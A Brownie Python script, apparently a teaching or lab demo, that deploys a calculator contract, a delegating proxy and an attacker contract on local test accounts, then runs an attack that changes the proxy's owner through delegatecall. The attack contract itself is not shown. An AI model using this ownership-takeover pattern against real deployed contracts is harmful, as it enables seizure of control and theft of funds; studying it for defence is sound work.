from brownie import DelegateCalc, DelegateCalcAttack, MainCalcCode, Contract, accounts, network


def main():
    owner = accounts[0]
    attacker = accounts[1]

    calc_contract = MainCalcCode.deploy({"from": owner})
    delegate_contract = DelegateCalc.deploy(calc_contract, {"from": owner})
    delegate_attack = DelegateCalcAttack.deploy(delegate_contract, {"from": attacker})

    print(f"owner before attack: {delegate_contract.owner()}")
    delegate_attack.attack()
    print(f"owner after attack: {delegate_contract.owner()}")

    network.disconnect()
